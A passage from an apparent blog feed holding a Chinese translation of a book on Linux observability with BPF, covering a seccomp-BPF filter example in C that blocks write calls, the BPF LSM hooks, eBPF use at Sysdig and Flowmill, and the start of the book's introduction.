<code>no_new_privs</code></p><p>EFAULT：传递的参数（<code>seccomp_data</code>结构中的参数）没有有效地址</p><p>EINVAL：它可以有四种含义</p><ul><li>此内核在其当前配置中不知道或不支持请求的操作</li><li>指定的标志对请求的操作无效</li><li>操作包括<code>BPF_ABS</code>，但是指定的偏移量有问题，可能超过<code>seccomp_data</code>结构的大小</li><li>传递给过滤器的指令数超过了最大指令数</li></ul><p>ENOMEM：没有足够的内存来执行程序</p><p>EOPNOTSUPP：该操作使用SECCOMP_GET_ACTION_AVAIL指定，但实际上内核不支持参数中的返回操作</p><p>ESRCH：同步另一个线程时出现问题</p><p>ENOSYS：SECCOMP_RET_TRACE操作没有附着跟踪器</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">prctl是一个系统调用，它允许用户空间程序控制（设置和获取）进程的特定方面，例如字节序、线程名称、安全计算 (Seccomp) 模式、权限、Perf事件等。</span><br></pre></td></tr></table></figure><p><code>Seccomp</code>可能听起来像是一种沙盒机制，但事实并非如此。<code>Seccomp</code>是一个实用程序，可让其用户开发沙盒机制。接下来我们将介绍如何编写程序来使用<code>Seccomp</code>系统调用直接调用的过滤器来编写自定义交互。</p><h4 id="Seccomp-BPF过滤器示例"><a href="#Seccomp-BPF过滤器示例" class="headerlink" title="Seccomp BPF过滤器示例"></a>Seccomp BPF过滤器示例</h4><p>在此示例中，我们展示了如何将前面描述的两个操作放在一起：</p><ul><li>编写Seccomp BPF程序以用作过滤器，基于做出的决定返回不同的代码</li><li>使用<code>prctl</code>加载过滤器</li></ul><p>首先，该示例需要来自标准库和Linux内核的一些头文件：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/audit.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/bpf.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/filter.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/seccomp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br></pre></td></tr></table></figure><p>在尝试执行这个例子之前，我们需要确保我们的内核已经将<code>CONFIG_SECCOMP</code>和 <code>CONFIG_SECCOMP_FILTER</code>设置为y。可以通过以下方式进行检查：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/config.gz| zcat | grep -i CONFIG_SECCOMP</span><br><span class="line">or</span><br><span class="line">cat /usr/src/kernels/&lt;linux-src&gt;/.config | grep -i CONFIG_SECCOMP</span><br></pre></td></tr></table></figure><p>其余代码是<code>install_filter</code>函数，由两部分组成。 第一部分包含BPF过滤指令列表：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">install_filter</span><span class="params">(<span class="keyword">int</span> nr, <span class="keyword">int</span> arch, <span class="keyword">int</span> error)</span> </span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">sock_filter</span> <span class="title">filter</span>[] = &#123;</span></span><br><span class="line">    BPF_STMT(BPF_LD + BPF_W + BPF_ABS, (offsetof(struct seccomp_data, arch))),</span><br><span class="line">    BPF_JUMP(BPF_JMP + BPF_JEQ + BPF_K, arch, <span class="number">0</span>, <span class="number">3</span>),</span><br><span class="line">    BPF_STMT(BPF_LD + BPF_W + BPF_ABS, (offsetof(struct seccomp_data, nr))),</span><br><span class="line">    BPF_JUMP(BPF_JMP + BPF_JEQ + BPF_K, nr, <span class="number">0</span>, <span class="number">1</span>),</span><br><span class="line">    BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_ERRNO | (error &amp; SECCOMP_RET_DATA)),</span><br><span class="line">    BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_ALLOW),</span><br><span class="line">  &#125;;</span><br></pre></td></tr></table></figure><p>这些指令是使用<code>linux/filter.h</code>中定义的<code>BPF_STMT</code>和<code>BPF_JUMP</code>宏设置的。</p><p>让我们看一下说明：</p><p>BPF_STMT(BPF_LD + BPF_W + BPF_ABS (offsetof(struct seccomp_data, arch)))：以字<code>BPF_W</code>与<code>BPF_LD</code> 的形式一起加载和累加，并且数据包数据包含在固定的<code>BPF_ABS</code>偏移量中</p><p>BPF_JUMP(BPF_JMP + BPF_JEQ + BPF_K, arch, 0, 3)：使用<code>BPF_JEQ</code>检查累加器常量<code>BPF_K</code>中的架构值是否等于<code>arch</code>。 如果是，它将以偏移量0跳转到下一条指令；否则，它将以偏移量3跳转并给出错误</p><p>BPF_STMT(BPF_LD + BPF_W + BPF_ABS (offsetof(struct seccomp_data, nr)))：以字<code>BPF_W</code>与<code>BPF_LD</code>的形式一起加载并累加，这是包含在固定<code>BPF_ABS</code>偏移处的系统调用数值数据</p><p>BPF_JUMP(BPF_JMP + BPF_JEQ + BPF_K, nr, 0, 1)：将系统调用号中的值与nr变量中的值进行比较。如果相等，将转到下一条指令并禁止系统调用；否则将允许带有SECCOMP_RET_ALLOW的系统调用</p><p>BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_ERRNO | (error &amp; SECCOMP_RET_DATA))：这将使用 <code>BPF_RET</code>终止程序并作为结果给出错误SEC COMP_RET_ERRNO，并带有来自<code>err</code>变量的指定错误号</p><p>BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_ALLOW)：使用<code>BPF_RET</code>终止程序并允许使用 SECCOMP_RET_ALLOW执行系统调用</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">你可能会想为什么要使用指令列表而不是编译后的ELF对象或JIT编译的C程序？</span><br><span class="line">主要有两个原因</span><br><span class="line">1.首先是Seccomp使用cBPF（经典BPF）而不是eBPF，这意味着它没有注册表，而只是一个累加器来存储最后的计算结果。</span><br><span class="line">2.第二个是Seccomp直接接受一个指向BPF指令数组的指针，没有别的。我们使用的宏只是以一种友好的方式指定这些指令的助手。</span><br></pre></td></tr></table></figure><p>在<code>socket_filter</code>结构体中定义过滤器代码后，我们需要定义一个<code>sock_fprog</code>包含过滤器代码和过滤器本身的计算长度。需要此数据结构作为声明流程操作的参数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sock_fprog</span> <span class="title">prog</span> = &#123;</span></span><br><span class="line">    .len = (<span class="keyword">unsigned</span> short)(<span class="keyword">sizeof</span>(filter) / <span class="keyword">sizeof</span>(filter[<span class="number">0</span>])),</span><br><span class="line">    .filter = filter,</span><br><span class="line">  &#125;;</span><br></pre></td></tr></table></figure><p>现在我们在<code>install_filter</code>函数中只剩一件事要做：加载程序本身！ 为此，我们使用PR_SET_SECCOMP 作为选项使用<code>prctl</code>，因为我们想进入安全计算模式。 然后我们指示模式使用SECCOMP_MODE_FILTER加载过滤器，该过滤器包含在我们的<code>sock_fprog</code>类型的<code>prog</code>变量中：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &amp;prog)) &#123;</span><br><span class="line">    perror(<span class="string">"prctl(PR_SET_SECCOMP)"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后，我们可以利用<code>install_filter</code>函数，但是在使用它之前，我们需要使用<code>prctl</code>设置当前执行的 PR_SET_NO_NEW_PRIVS以避免子进程可以拥有比父进程更广泛的权限。这样我们可以在没有root权限的情况下在<code>install_filter</code>函数中进行<code>prctl</code>调用。</p><p>现在可以调用<code>install_filter</code>函数。 我们将阻止所有与X86-64体系结构相关的写入系统调用，并且只会授予拒绝所有尝试的权限。过滤器安装后，我们只需使用第一个参数继续执行：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> <span class="keyword">const</span> *argv[])</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (prctl(PR_SET_NO_NEW_PRIVS, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)) &#123;</span><br><span class="line">    perror(<span class="string">"prctl(NO_NEW_PRIVS)"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  install_filter(__NR_write, AUDIT_ARCH_X86_64, EPERM);</span><br><span class="line">  <span class="keyword">return</span> system(argv[<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译程序可以使用<code>clang</code>或<code>gcc</code>； </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">clang main.c -o filter-write</span><br></pre></td></tr></table></figure><p>我们已经阻止了程序中的所有写入。为了测试它，我们需要一个可以写的程序；<code>ls</code>似乎是一个不错的选择，下面是它的正常运行方式：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos seccomp]# ls -la</span><br><span class="line">total 32</span><br><span class="line">drwxr-xr-x 2 root root  4096 Jun  4 10:10 .</span><br><span class="line">drwxr-xr-x 3 root root  4096 Jun  4 10:09 ..</span><br><span class="line">-rwxr-xr-x 1 root root 17832 Jun  4 10:10 filter-write</span><br><span class="line">-rw-r--r-- 1 root root  1210 Jun  4 10:10 main.c</span><br></pre></td></tr></table></figure><p>接着我们只需将要测试的程序作为第一个参数传递：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos seccomp]# ./filter-write "ls -la"</span><br></pre></td></tr></table></figure><p>执行后输出为空，我们可以使用<code>strace</code>来查看发生了什么：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos seccomp]# strace -f ./filter-write "ls -la"</span><br></pre></td></tr></table></figure><p>以下输出结果去掉了很多无用的输出，相关部分显示写入被EPERM错误阻止，这与我们设置的相同。 这意味着程序是执行成功的，因为它现在无法访问该系统调用：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[pid 390331] write(2, "ls: ", 4)        = -1 EPERM (Operation not permitted)</span><br><span class="line">[pid 390331] write(2, "write error", 11) = -1 EPERM (Operation not permitted)</span><br><span class="line">[pid 390331] write(2, "\n", 1)          = -1 EPERM (Operation not permitted)</span><br></pre></td></tr></table></figure><p>现在你已经了解了Seccomp BPF的运作方式以及您可以用它做什么。 但是，如果有一种方法可以使用eBPF而不是cBPF实现同样的效果，那不是很好吗？</p><p>在考虑eBPF程序时，大多数人认为只是编写它们并以root权限加载它们。 尽管这句话通常是正确的，但内核实现了一套机制来保护各个级别的eBPF对象。 这些机制称为BPF LSM钩子。</p><h3 id="BPF-LSM钩子"><a href="#BPF-LSM钩子" class="headerlink" title="BPF LSM钩子"></a>BPF LSM钩子</h3><p>为了提供对系统事件的独立于体系结构的控制，LSM实现了钩子的概念。从技术上讲，钩子调用类似于系统调用。然而，独立于系统并与LSM框架集成使得钩子变得有趣，因为它提供的抽象层很方便，并且可以避免在不同架构上使用系统调用时可能发生的麻烦。</p><p>在撰写本文时，内核有七个与BPF程序相关的钩子，而SELinux是唯一实现它们的in-tree LSM。你可以在此文件的内核源码中看到这一点：<code>include/linux/security.h</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">extern</span> <span class="keyword">int</span> <span class="title">security_bpf</span><span class="params">(<span class="keyword">int</span> cmd, <span class="keyword">union</span> bpf_attr *attr, <span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span>; </span><br><span class="line"><span class="function"><span class="keyword">extern</span> <span class="keyword">int</span> <span class="title">security_bpf_map</span><span class="params">(struct bpf_map *<span class="built_in">map</span>, <span class="keyword">fmode_t</span> fmode)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">extern</span> <span class="keyword">int</span> <span class="title">security_bpf_prog</span><span class="params">(struct bpf_prog *prog)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">extern</span> <span class="keyword">int</span> <span class="title">security_bpf_map_alloc</span><span class="params">(struct bpf_map *<span class="built_in">map</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">extern</span> <span class="keyword">void</span> <span class="title">security_bpf_map_free</span><span class="params">(struct bpf_map *<span class="built_in">map</span>)</span></span>; </span><br><span class="line"><span class="function"><span class="keyword">extern</span> <span class="keyword">int</span> <span class="title">security_bpf_prog_alloc</span><span class="params">(struct bpf_prog_aux *aux)</span></span>; </span><br><span class="line"><span class="function"><span class="keyword">extern</span> <span class="keyword">void</span> <span class="title">security_bpf_prog_free</span><span class="params">(struct bpf_prog_aux *aux)</span></span>;</span><br></pre></td></tr></table></figure><p>每一个钩子都将在执行的不同阶段被调用：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">security_bpf：对已执行的BPF系统调用进行初始检查</span><br><span class="line">security_bpf_map：检查内核何时返回映射的文件描述符</span><br><span class="line">security_bpf_prog：检查内核何时返回eBPF程序的文件描述符</span><br><span class="line">security_bpf_map_alloc：是否初始化BPF映射中的安全字段</span><br><span class="line">security_bpf_map_free：是否清理BPF映射中的安全字段</span><br><span class="line">security_bpf_prog_alloc：是否在BPF程序中初始化安全字段</span><br><span class="line">security_bpf_prog_free：是否清理BPF程序中的安全字段</span><br></pre></td></tr></table></figure><h3 id="结论-3"><a href="#结论-3" class="headerlink" title="结论"></a>结论</h3><p>安全性不是一种以通用方式为你想要保护的所有内容实施的东西。能够以不同的方式在不同的层次上保护系统是很重要的，保护系统的最好方法是以不同的视角堆叠不同的层，这样一个受损的层就不会有能力访问整个系统。内核开发人员为我们提供了一组不同的层和交互点，我们希望能让你很好地理解层是什么以及如何使用BPF程序与它们进行交互。</p><h2 id="第九章节"><a href="#第九章节" class="headerlink" title="第九章节"></a>第九章节</h2><h3 id="Sysdig-eBPF-God-Mode"><a href="#Sysdig-eBPF-God-Mode" class="headerlink" title="Sysdig eBPF God Mode"></a>Sysdig eBPF God Mode</h3><p>制作同名开源Linux故障排除工具的公司<code>Sysdig</code>于2017年开始在内核4.11下使用eBPF。</p><p>过去该公司一直使用内核模块来提取和完成所有内核端工作，但随着用户群的增加以及越来越多的公司开始试验，该公司承认在许多方面对大多数外部行为是一种限制：</p><ul><li>越来越多的用户无法在他们的机器上加载内核模块。 云原生平台对运行时程序的功能越来越严格</li><li>新贡献者（甚至老贡献者）不了解内核模块的体系结构。这减少了贡献者的总数，并成为了项目本身发展的一个限制因素</li><li>内核模块的维护很困难，不仅仅是因为编写代码，还需要努力保持它的安全和组织良好</li></ul><p>出于这些动机，<code>Sysdig</code>决定尝试编写与模块中相同的一组功能，但改用eBPF程序的方法。 采用eBPF自动带来的另一个好处是<code>Sysdig</code>可以进一步利用其他不错的eBPF跟踪功能。 例如，使用用户探针将eBPF程序附加到用户空间应用程序中的特定执行点相对容易。</p><p>此外，该项目现在可以在eBPF程序中使用原生辅助函数功能来捕获正在运行的进程的堆栈跟踪，以增强典型的系统调用事件流。为用户提供了更多故障排除信息。</p><p>由于eBPF虚拟机的限制，<code>Sysdig</code>在开始最初面临一些挑战，因此该项目的首席架构师Gianluca Borello决定通过为内核本身提供上游补丁来改进它，包括：</p><ul><li>原生处理eBPF程序中的字符串的能力</li><li>多个补丁来改进eBPF程序，<a href="!https://patchwork.ozlabs.org/patch/840473/">1</a>,<a href="!https://patchwork.ozlabs.org/patch/840470/">2</a>,<a href="!https://patchwork.ozlabs.org/patch/840471/">3</a></li></ul><p>后者对于处理系统调用参数尤其重要，这或许是该工具中可用的最重要的数据源。</p><p>如下所示是Sysdig中的eBPF架构图</p><p><img src="/2022/05/29/使用BPF的Linux可观测性-下篇-翻译/6.png" alt="6"></p><p>实现的核心是负责检测的自定义eBPF程序的集合。 这些程序是用C语言的一个子集编写的。 们是使用最新版本的<code>Clang</code>和<code>LLVM</code>编译的，它们将高级C代码转换为eBPF字节码。</p><p><code>Sysdig</code>检测内核的每个不同执行点都有一个eBPF程序。目前，eBPF程序附加到以下静态跟踪点：</p><ul><li>System call entry path</li><li>System call exit path</li><li>Process context switch</li><li>Process termination</li><li>Minor and major page faults</li><li>Process signal delivery</li></ul><p>每个程序接收执行点数据（例如，对于系统调用，调用进程传递的参数）并开始处理它们。 处理取决于系统调用的类型。 对于简单的系统调用，参数只是逐字复制到eBPF映射中，用于临时存储，直到形成整个事件框架。对于其他复杂的调用，eBPF程序包括翻译或扩充参数的逻辑。这使用户空间中的<code>Sysdig</code>应用程序能够充分利用数据。</p><p>一些附加数据包括以下内容：</p><ul><li>与网络连接相关的数据（TCP/UDP IPv4/IPv6 元组、UNIX套接字名称等）</li><li>与进程相关的指标（内存计数器、页面错误、套接字队列长度等）</li><li>容器特定数据，例如发出系统调用的进程所属的<code>cgroup</code>，以及进程所在的命名空间</li></ul><p>在上面<code>Sysdig</code>的eBPF架构图中，eBPF程序为特定系统调用捕获所有需要的数据后，使用一个特殊的本地BPF函数将数据推送到一组CPU的环形缓冲区，用户空间应用程序可以以非常高的吞吐量读取。 这不同于使用eBPF映射与用户空间共享内核空间中生成的“小数据”的典型范例。 </p><h3 id="Flowmill"><a href="#Flowmill" class="headerlink" title="Flowmill"></a>Flowmill</h3><p>Flowmill是一家可观测性初创公司，其创始人乔纳森·佩里（Jonathan Perry）从一个名为<code>Flowtune</code>的学术研究项目中脱颖而出。<code>Flowtune</code>研究了如何在拥塞的数据中心网络中有效地调度单个数据包。这项工作所需的核心技术之一是以极低的开销收集网络遥测数据的方法。Flowmill最终采用了这项技术来观察、聚合和分析分布式应用程序中每个组件之间的连接，以执行以下操作：</p><ul><li>提供服务如何在分布式系统中交互的准确视图</li><li>统计流量速率、错误或延迟显着变化的区域</li></ul><p>Flowmill使用eBPF内核探针来跟踪每个打开的套接字并定期捕获它们的操作系统指标。这很复杂，原因有很多：</p><ul><li>在建立 eBPF 探针时，有必要检测新连接和已经打开的现有连接。 此外，它必须考虑到TCP和UDP以及通过内核的IPv4和IPv6代码路径。</li><li>对于基于容器的系统，每个套接字都必须归属于相应的<code>cgroup</code>，并与来自Kubernetes或Docker等平台的编排器元数据相结合。</li><li>必须对通过<code>conntrack</code>执行的网络地址转换进行检测，以建立套接字与其外部可见IP地址之间的映射。 例如，在Docker中，常见的网络模型使用源NAT来伪装主机IP地址和Kubernetes后面的容器，并使用服务虚拟IP地址来表示一组容器。</li><li>eBPF程序收集的数据必须经过后处理，以按服务提供聚合并匹配在连接两侧收集的数据。</li></ul><p>然而，添加eBPF内核探针提供了一种更有效和更强大的方式来收集这些数据。它消除了丢失连接的风险，并且可以在秒级间隔内以低开销在每个套接字上完成。Flowmill的方法依赖一个代理，该代理结合了一组eBPF kprobes和用户空间指标收集以及机外聚合和后处理。该实现大量使用Perf环将在每个套接字上收集的指标传递到用户空间以做进一步处理。此外，它使用哈希映射来跟踪打开的TCP和UDP套接字。</p><p>例如，<code>tcp_v4_do_rcv</code>捕获所有已建立的TCP RX流量并可以访问<code>struct sock</code>，但调用量非常大。相反，用户可以检测处理ACK、乱序数据包处理、RTT预测等功能，从而允许处理影响已知指标的特定事件。</p><p>使用这种跨TCP、UDP、进程、容器、conntrack和其他子系统的方法可以实现非常好的系统性能，并且开销足够低，这在大多数系统中是难以测量的。CPU开销通常为每个内核0.1%到0.25%，包括eBPF和用户空间组件，主要取决于创建新套接字的速率。</p><p>Sysdig和Flowmill是使用BPF构建监控和可观察性工具的先驱，但他们并不是唯一的。 在整本书中，我们提到了其他公司，如Cillium和Facebook，它们采用BPF作为框架来提供高度安全和高性能的网络基础设施。 对于BPF的未来我们是充满期待的！</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;第五章节&quot;&gt;&lt;a href=&quot;#第五章节&quot; class=&quot;headerlink&quot; title=&quot;第五章节&quot;&gt;&lt;/a&gt;第五章节&lt;/h2&gt;&lt;h3 id=&quot;BPF实用程序&quot;&gt;&lt;a href=&quot;#BPF实用程序&quot; class=&quot;headerlink&quot; title=&quot;BPF
      
    
    </summary>
    
    
      <category term="Notes" scheme="elssm.github.io/tags/Notes/"/>
    
  </entry>
  
  <entry>
    <title>使用BPF的Linux可观测性(上篇)-翻译</title>
    <link href="elssm.github.io/2022/05/27/%E4%BD%BF%E7%94%A8BPF%E7%9A%84Linux%E5%8F%AF%E8%A7%82%E6%B5%8B%E6%80%A7-%E4%B8%8A%E7%AF%87-%E7%BF%BB%E8%AF%91/"/>
    <id>elssm.github.io/2022/05/27/使用BPF的Linux可观测性-上篇-翻译/</id>
    <published>2022-05-27T08:18:52.000Z</published>
    <updated>2022-05-27T08:23:08.182Z</updated>
    
    <content type="html"><![CDATA[<h2 id="第一章节"><a href="#第一章节" class="headerlink" title="第一章节"></a>第一章节</h2><h3 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h3><p>过去十几年计算机系统变得越来越复杂。关于如何获取软件的行为就已经创造了很多的业务类别，这些业务类别都试图解决观测复杂系统的挑战。一种可观测的方法是分析运行在系统中的程序所产生的数据日志，日志是一种很好的信息源，它们可以为您提供有关应用程序行为的精确数据，然而事实是你只能获取到工程师在创建该程序时暴露在外面的日志信息。从任何系统收集日志格式的信息都可能像反编译程序和查看执行流一样具有挑战性。另一种比较流行的方法是使用指标来解释程序的行为方式。指标在数据格式上不同于日志；日志为你提供了明确的数据，而指标则聚合数据来衡量程序在特定时间点的行为。</p><p>可观测性是一种从不同角度处理这个问题的新兴实践。人们将可观测性定义为我们必须提出任意问题并从任何给定系统接收复杂答案的能力。可观测性、日志和指标聚合之间的一个关键区别在于你所收集的数据。鉴于通过实践可观测性你需要在任何时间点回答任意问题，对数据进行推理的唯一方法是收集系统可以生成的所有数据，并仅在需要回答问题时对其进行聚合。</p><p>黑天鹅事件在软件工程中比我们想象的更普遍，而且是不可避免的。因为我们可以假设我们无法阻止此类事件，所以我们唯一的选择是拥有尽可能多的关于它们的信息来解决它们，而不会对业务系统造成严重影响。可观测性帮助我们构建强大的系统并减轻未来会发生的黑天鹅事件，因为它基于你收集的任何数据可以回答未来所发生的任何问题的前提。对黑天鹅事件的研究和实践可观测性集中在一个中心点，即你从系统收集的数据中。</p><p>Linux容器是Linux内核上一组功能的抽象，用于隔离和管理计算机进程。传统上负责资源管理的内核还提供任务隔离和安全性。在Linux中，容器主要基于<code>namespaces</code>和<code>cgroups</code>。<code>namespaces</code>是将任务彼此隔离的组件。从某种意义上说，当你在一个<code>namespaces</code>中时，你会体验到操作系统就像没有其他任务在计算机上运行一样。<code>cgroups</code> 是提供资源管理的组件。从操作的角度来看，它们可以让你对任何资源使用情况进行细粒度控制，例如 CPU、磁盘 I/O、网络等。在过去十年中，随着Linux容器的普及，软件工程师设计大型分布式系统和计算平台的方式发生了转变。多租户计算已经完全依赖于内核中的这些特性。</p><p>通过如此依赖 Linux 内核的低级功能，我们挖掘了一个新的复杂性和信息来源，我们在设计可观察系统时需要考虑这些来源。内核是一个事件系统，这意味着所有的工作都是基于事件来描述和执行的。打开文件是一种事件，CPU执行任意指令是一种事件，接收网络数据包是一种事件等等。<code>Berkeley Packet Filter</code> (BPF) 是内核中的一个子系统，可以检查这些新的信息源。BPF允许你编写在内核触发任何事件时安全执行的程序。 BPF为你提供强大的安全保证，以防止你在这些程序中注入使系统崩溃的恶意行为。 BPF正在开发新一轮工具，帮助系统开发人员观察和使用这些新平台。</p><h3 id="BPF历史"><a href="#BPF历史" class="headerlink" title="BPF历史"></a>BPF历史</h3><p>1992年的时候出现了一篇名为“The BSD Packet Filter: A New Architecture for User-Level Packet Capture”的论文，在该论文中，作者描述了他们如何为Unix内核实现网络数据包过滤器，该过滤器的速度比当时最先进的数据包过滤器快20倍。包过滤器有一个特定的目的：为监控系统网络的应用程序提供来自内核的直接信息。有了这些信息，应用程序就可以决定如何处理这些数据包。 BPF 在包过滤方面引入了两大创新：</p><ul><li>一种新的虚拟机 (VM)，旨在与基于寄存器的CPU高效工作。</li><li>每个应用程序缓冲区的使用，可以在不复制所有数据包信息的情况下过滤数据包。这最大限度地减少了决策所需的BPF数据量。</li></ul><p>这些巨大的改进使所有Unix系统都采用BPF作为网络数据包过滤的首选技术，放弃了消耗更多内存且性能较低的旧实现。 这种实现仍然存在于该Unix内核的许多衍生产品中，包括Linux内核。</p><p>2014年的时候，Alexei Starovoitov介绍了eBPF的实现。这种新设计针对现代硬件进行了优化，使其生成的指令集比旧BPF解释器生成的机器代码更快。这个扩展版本还将BPF VM中的寄存器数量从两个32位寄存器增加到十个64位寄存器。寄存器数量和位宽的增加为编写更复杂的程序提供了可能性，因为开发人员可以使用函数参数自由地交换更多信息。 这些更改以及其他改进使扩展的BPF版本比原始BPF实现快了四倍。</p><p>这个新实现的最初目标是优化处理网络过滤器的内部BPF指令集。此时，BPF仍然受限于内核空间，只有少数用户空间的程序可以编写BPF过滤器供内核处理，如<code>Tcpdump</code>和<code>Seccomp</code>，今天，这些程序仍然为旧的BPF解释器生成字节码，但内核将这些指令翻译为改进更大的内部表示。</p><p>2014年6月，BPF的扩展版本被暴露给用户空间。 这是BPF的一个转折点。 正如Alexei在引入这些更改的补丁中所写的那样，“这个补丁集展示了eBPF的潜力。”</p><p>BPF成为顶级内核子系统，不再局限于网络堆栈。 BPF程序开始看起来更像内核模块，非常强调安全性和稳定性。 与内核模块不同，BPF程序不需要你重新编译你的内核，并且它们可以保证在不崩溃的情况下完成。</p><p>BPF验证器确保任何BPF程序都将在不崩溃的情况下完成，并确保程序不会尝试访问超出范围的内存。但是，这些优势伴随着某些限制：程序具有允许的最大大小，并且需要限制循环以确保系统的内存永远不会被错误的BPF程序耗尽。</p><p>随着使BPF可以从用户空间访问的更改，内核开发人员还添加了一个新的系统调用，<code>bpf</code>。 这个新的系统调用将成为用户空间和内核之间通信的中心部分。<code>BPF maps</code>将成为内核和用户空间之间交换数据的主要机制。eBPF是本书的起点。 在过去的五年中，BPF自从引入这个扩展版本以来已经发生了显着的变化，我们详细介绍了BPF程序的演变、<code>BPF map</code>和受这种演变影响的内核子系统。</p><h3 id="BPF结构"><a href="#BPF结构" class="headerlink" title="BPF结构"></a>BPF结构</h3><p>正如前面提到的，BPF是一种高度先进的虚拟机，在隔离环境中运行代码指令。 从某种意义上说，你可以将BPF视为你对Java虚拟机(JVM)的看法，这是一个运行由高级编程语言编译的机器代码的专用程序。LLVM之类的编译器和不久的将来的<code>GNU Compiler Collection(GCC)</code>都提供对BPF的支持，允许你将C代码编译成BPF指令。在你的代码被编译之后，BPF使用一个验证器来确保内核可以安全地运行程序。 它可以防止你运行可能使内核崩溃而危及系统的代码。如果你的代码是安全的，BPF程序将被加载到内核中。 